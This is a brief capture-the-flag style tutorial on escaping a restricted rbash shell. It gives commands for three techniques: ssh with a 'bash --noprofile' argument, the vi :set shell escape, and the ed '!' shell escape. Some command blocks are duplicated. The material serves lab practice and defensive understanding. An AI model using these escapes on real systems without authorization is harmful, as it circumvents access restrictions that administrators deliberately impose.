Our First Method is Escaping the rbash shell through ssh many ctf playing times we have ssh username and password but our shell is restricted with rbash. we can easily bypass this rbash shell using extra argument bash noprofile
```bash
ssh hacknos@172.20.10.2
echo $SHELL
cd ../
ssh hacknos@172.20.10.2
echo $SHELL
cd ../
```
we can bypass the rbash shell using the no-profile extra parameter
```bash
ssh hackNos@<IP-Adress> -t "bash --noprofile"
cd ../
ssh hackNos@<IP-Adress> -t "bash --noprofile"
cd ../
```


First, we open the vi editor then we used: set option and we create a shell name variable and in this variable, we set our bash environment location. run the command one by one


run the vi command and our vi editor is open using the set mode we can bypass the restricted rbash shell
```bash
vi
:set shell=/bin/bash
:shell
vi
:set shell=/bin/bash
:shell
```

escaping rbash – ed editor
ed is another Linux editor simple we can run ed edit mode without selecting any file then we type bash path
```bash
cd /home
echo $SHELL
ed
!'/bin/bash'
pwd
```